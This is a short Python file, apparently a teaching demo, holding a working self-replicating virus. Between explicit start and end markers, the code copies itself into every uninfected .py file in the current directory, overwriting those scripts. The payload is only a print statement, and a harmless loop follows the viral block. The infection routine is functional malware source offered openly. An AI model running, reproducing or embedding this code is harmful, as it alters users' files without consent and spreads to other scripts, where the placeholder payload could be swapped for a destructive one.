# test.py

### THE VIRUS STARTS HERE ###

import sys
import glob

code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False

for line in lines:
    if line == '### THE VIRUS STARTS HERE ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### THE VIRUS ENDS HERE ###\n':
        break

python_scripts = glob.glob('*.py')

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '### THE VIRUS STARTS HERE ###\n':
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)

# Malicious piece of code (payload)
print('THIS IS THE VIRUS')

### THE VIRUS ENDS HERE ###



for x in range(10):
    print(x)